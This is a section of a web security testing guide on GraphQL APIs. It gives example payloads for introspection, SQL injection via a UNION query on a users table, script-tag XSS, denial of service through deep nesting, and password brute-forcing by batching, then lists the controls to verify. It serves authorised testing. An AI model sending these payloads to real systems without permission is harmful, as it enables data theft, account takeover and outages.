# 4.12 API Testing (WSTG-APIT)

API-specific tests. Currently covers GraphQL.

---

## WSTG-APIT-01: GraphQL Testing
**Introspection Query:**
```graphql
query { __schema { types { name kind } } }
query { __type(name:"User") { fields { name type { name } } } }
```

**Attack Vectors:**

**SQL Injection via GraphQL:**
```graphql
query { dogs(namePrefix: "ab%' UNION ALL SELECT 50,username,NULL FROM users LIMIT ? -- ", limit: 100) { id name } }
```

**XSS via GraphQL:**
```graphql
query { myInfo(veterinaryId:"<script>alert('1')</script>") { id name } }
```

**DoS via Deep Nesting:**
```graphql
query { users { friends { friends { friends { friends { name } } } } } }
```

**Auth Bypass via Batching:**
```graphql
[{"query":"{ auth(password:\"a\")"},{"query":"{ auth(password:\"b\")"},...] # 100 passwords in one request
```

**Tools:** GraphQL Voyager, InQL (Burp), GraphQL Raider (Burp), graphqlmap, sqlmap with GraphQL

**Security Controls to Verify:**
- Introspection disabled in production
- Query depth limiting
- Query complexity limiting
- Rate limiting per query
- Input validation (graphql-constraint-directive)
- Object-level authorization on each resolver
